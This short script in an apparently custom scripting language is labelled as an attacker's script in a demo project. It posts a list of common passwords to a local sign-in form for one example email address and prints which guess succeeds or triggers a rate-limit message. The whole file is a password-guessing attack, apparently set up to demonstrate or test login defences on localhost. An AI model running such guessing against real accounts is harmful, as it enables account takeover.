// The attacker's other script: common passwords, one after another, for one email.
//   .quillo/bin/quillo run attacks/guess-password.qwe
let GUESSES = ["123456", "password", "qwerty", "letmein", "iloveyou", "sunshine", "tomato-soup"]
let FORM = { "content-type": "application/x-www-form-urlencoded" }
let SAYS = "Wrong email or password\\.|Too many tries[^<]*"

for pw in GUESSES {
    let body = `email=ana%40example.com&password=${url_encode(pw)}`
    let r = http.post("http://localhost:8080/sign-in", body, FORM, { redirects: 0 })
    print(`${pw}  ${r.status}  ${r.status == 303 ? "signed in!" : re.find(r.body, SAYS)?.text ?? "?"}`)
}
